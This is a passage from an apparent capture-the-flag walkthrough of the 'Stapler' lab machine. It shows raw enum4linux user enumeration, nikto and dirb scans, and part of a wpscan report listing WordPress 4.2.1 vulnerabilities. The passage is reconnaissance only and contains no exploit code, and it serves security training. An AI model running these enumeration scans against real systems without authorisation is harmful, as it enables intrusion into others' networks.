S-1-5-21-864226560-67800430-3082388513-1032 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1033 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1034 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1035 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1036 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1037 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1038 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1039 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1040 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1041 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1042 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1043 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1044 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1045 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1046 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1047 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1048 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1049 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

 ================================================
|    Getting printer info for 192.168.118.184    |
 ================================================
No printers returned.


enum4linux complete on Fri May 19 15:06:06 2017

root@kali:~#

A full port scan shows a service runnning on a nonstandare port.

http://192.168.118.184:12380/

root@kali:~/stapler# nikto -host http://192.168.118.184:12380/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.118.184
+ Target Hostname:    192.168.118.184
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2017-05-19 15:25:10 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.118.184' does not match certificate's names: Red.Initech
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7690 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2017-05-19 15:26:42 (GMT-6) (92 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

root@kali:~/stapler# dirb https://192.168.118.184:12380

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 19 15:33:37 2017
URL_BASE: https://192.168.118.184:12380/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.118.184:12380/ ----
==> DIRECTORY: https://192.168.118.184:12380/announcements/                                                            
+ https://192.168.118.184:12380/index.html (CODE:200|SIZE:21)                                                          
==> DIRECTORY: https://192.168.118.184:12380/javascript/                                                               
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/                                                               
+ https://192.168.118.184:12380/robots.txt (CODE:200|SIZE:59)                                                          
+ https://192.168.118.184:12380/server-status (CODE:403|SIZE:306)                                                      

---- Entering directory: https://192.168.118.184:12380/announcements/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.118.184:12380/javascript/ ----
==> DIRECTORY: https://192.168.118.184:12380/javascript/jquery/                                                        

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/doc/                                                           
+ https://192.168.118.184:12380/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                           
+ https://192.168.118.184:12380/phpmyadmin/index.php (CODE:200|SIZE:10333)                                             
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/js/                                                            
+ https://192.168.118.184:12380/phpmyadmin/libraries (CODE:403|SIZE:313)                                               
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/                                                        
+ https://192.168.118.184:12380/phpmyadmin/phpinfo.php (CODE:200|SIZE:10335)                                           
+ https://192.168.118.184:12380/phpmyadmin/setup (CODE:401|SIZE:465)                                                   
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/sql/                                                           
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/themes/                                                        

---- Entering directory: https://192.168.118.184:12380/javascript/jquery/ ----
+ https://192.168.118.184:12380/javascript/jquery/jquery (CODE:200|SIZE:284394)                                        

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/doc/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/doc/html/                                                      

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/js/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/js/jquery/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/js/transformations/                                            

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/az/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/bg/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/ca/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/cs/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/da/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/de/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/el/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/es/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/et/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/fi/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/fr/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/gl/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/hu/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/ia/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/id/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/it/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/ja/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/ko/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/lt/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/nl/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/pl/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/pt/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/pt_BR/                                                  
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/ro/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/ru/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/si/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/sk/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/sl/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/sq/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/sv/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/tr/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/uk/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/vi/                                                     
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/zh_CN/                                                  
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/locale/zh_TW/                                                  

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/sql/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/components/                                          
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/database/                                            
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/error/                                               
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/javascript/                                          
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/list/                                                
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/navigation/                                          
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/table/                                               
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/test/                                                

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/themes/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/themes/original/                                               

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/doc/html/ ----
+ https://192.168.118.184:12380/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                   

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/js/jquery/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/js/transformations/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/az/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/bg/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ca/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/cs/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/da/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/de/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/el/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/es/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/et/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/fi/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/fr/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/gl/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/hu/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ia/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/id/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/it/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ja/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ko/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/lt/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/nl/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/pl/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/pt/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/pt_BR/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ro/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/ru/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/si/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/sk/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/sl/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/sq/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/sv/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/tr/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/uk/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/vi/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/zh_CN/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/locale/zh_TW/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/components/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/database/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/error/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/javascript/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/list/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/navigation/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/table/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/table/chart/                                         
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/templates/table/search/                                        

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/test/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/themes/original/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/themes/original/css/                                           
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/themes/original/img/                                           
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/themes/original/jquery/                                        

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/table/chart/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/templates/table/search/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/themes/original/css/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/themes/original/img/ ----

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: https://192.168.118.184:12380/phpmyadmin/themes/original/jquery/images/                                 

---- Entering directory: https://192.168.118.184:12380/phpmyadmin/themes/original/jquery/images/ ----
                                                                               ages/zt                                 
-----------------
END_TIME: Fri May 19 15:36:44 2017
DOWNLOADED: 290556 - FOUND: 10


http just shows a generic image...https has much more interesting things.

https://192.168.118.184:12380/blogblog/ is a wordpress site

https://192.168.118.184:12380/phpmyadmin/ is a phpmyadmin site

Lets see what wpscan can turn up

root@kali:~/stapler# wpscan --disable-tls-checks --url https://192.168.118.184:12380/blogblog/ --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://192.168.118.184:12380/blogblog/
[+] Started: Fri May 19 15:48:18 2017

[!] The WordPress 'https://192.168.118.184:12380/blogblog/readme.html' file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn't look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: https://192.168.118.184:12380/blogblog/wp-login.php?action=register
[+] XML-RPC Interface available under: https://192.168.118.184:12380/blogblog/xmlrpc.php
[!] Upload directory has directory listing enabled: https://192.168.118.184:12380/blogblog/wp-content/uploads/
[!] Includes directory has directory listing enabled: https://192.168.118.184:12380/blogblog/wp-includes/

[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 41 vulnerabilities identified from the version number

[!] Title: WordPress 4.1-4.2.1 - Genericons Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7979
    Reference: https://codex.wordpress.org/Version_4.2.2
[i] Fixed in: 4.2.2

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8126
    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
    Reference: https://wpvulndb.com/vulnerabilities/8130
    Reference: https://core.trac.wordpress.org/changeset/33536
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
    Reference: https://core.trac.wordpress.org/changeset/33529
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8132
    Reference: https://core.trac.wordpress.org/changeset/33541
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8133
    Reference: https://core.trac.wordpress.org/changeset/33549
    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8187
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - Publish Post & Mark as Sticky Permission Issue
    Reference: https://wpvulndb.com/vulnerabilities/8188
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
[i] Fixed in: 4.2.5

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8358
    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
[i] Fixed in: 4.2.6

[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8376
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36435
    Reference: https://hackerone.com/reports/110801
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
[i] Fixed in: 4.2.7

[!] Title: WordPress 3.7-4.4.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8377
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36444
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
[i] Fixed in: 4.2.7

[!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
    Reference: https://wpvulndb.com/vulnerabilities/8473
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
    Reference: https://wpvulndb.com/vulnerabilities/8474
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8475
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
[i] Fixed in: 4.5

[!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8488
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
    Reference: https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
[i] Fixed in: 4.5.2

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
    Reference: https://wpvulndb.com/vulnerabilities/8489
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
    Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
    Reference: http://avlidienbrunn.com/wp_some_loader.php
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
[i] Fixed in: 4.2.8

[!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
    Reference: https://wpvulndb.com/vulnerabilities/8518
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
[i] Fixed in: 4.2.9

[!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/8519
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
    Reference: https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
[i] Fixed in: 4.2.9

[!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
    Reference: https://wpvulndb.com/vulnerabilities/8520
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
[i] Fixed in: 4.2.9

[!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
    Reference: https://wpvulndb.com/vulnerabilities/8615
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
    Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
    Reference: http://seclists.org/fulldisclosure/2016/Sep/6
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
[i] Fixed in: 4.2.10

[!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
    Reference: https://wpvulndb.com/vulnerabilities/8616
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
[i] Fixed in: 4.2.10

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 4.2.11

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https://wpvulndb.com/vulnerabilities/8718
    Reference: https://www.mehmetince.net/low-severity-wordpress/
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
[i] Fixed in: 4.2.11

[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https://wpvulndb.com/vulnerabilities/8719
    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
[i] Fixed in: 4.2.11

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8720
    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
